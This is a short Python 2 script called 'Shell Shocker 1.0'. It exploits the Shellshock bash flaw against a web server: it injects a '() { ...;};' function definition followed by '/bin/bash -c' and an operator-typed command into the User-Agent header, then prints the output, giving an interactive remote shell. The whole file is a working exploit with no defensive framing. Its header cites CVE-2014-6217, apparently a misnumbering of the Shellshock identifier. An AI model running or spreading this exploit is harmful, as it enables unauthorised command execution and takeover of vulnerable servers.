#!/usr/bin/python
# Shell Shocker 1.0
# A Python script exploiting CVE-2014-6217
# Written by: Nick Sanzotta

from mechanize import Browser, _http
import sys


	#######################
	# Mechanize Browser
	#######################
br = Browser()

	#######################
	# Main Function
	#######################
def Main():
	url = raw_input("Please enter an URL: ")
	loop = 1
	while loop == 1:
		command=raw_input("$ ")
		br.addheaders = [('User-agent', '() { Xsploit;}; echo Content-Type: text/plain ; echo ; /bin/bash -c "'+command+'"')]		
		response = br.open(url)
		print response.read()
		if command =="exit":
			loop = 0
			

if __name__ == "__main__":
	Main()
